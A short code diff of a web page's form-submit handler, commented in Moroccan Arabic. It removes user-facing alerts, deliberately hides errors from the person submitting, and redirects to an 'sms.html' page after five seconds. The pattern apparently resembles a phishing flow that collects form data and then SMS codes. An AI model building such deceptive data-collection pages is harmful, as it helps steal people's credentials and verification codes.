@@ -263,20 +263,21 @@ form.addEventListener("submit", async (e) => {
       body: JSON.stringify(data),
     });
 
-    const result = await res.json();
-    alert(result.message);
-    form.reset();
-  } catch (err) {
-    alert("errors");
-    console.error(err);
-  }
-	  // بعد 5 ثواني (5000 ملي ثانية)، تحويل لصفحة sms.html
-  setTimeout(() => {
-    window.location.href = "sms.html";
-  }, 5000);
+    // نرسل البيانات ولكن **ما نعرضش alert**
+    // form.reset(); // ممكن تمسح الفورم إذا بغيت
 
+    // بعد 5 ثواني، redirect ل sms.html
+    setTimeout(() => {
+      window.location.href = "sms.html";
+    }, 5000);
+
+  } catch (err) {
+    console.error(err);
+    // نقدر ما نعرضوش alert باش ما يبانش خطأ
+  }
 });
 </script>
+
 
 <footer>
 <div class="container">
@@ -295,6 +296,7 @@ form.addEventListener("submit", async (e) => {
 </footer>
 </body>
 </html>
+
 
 
 
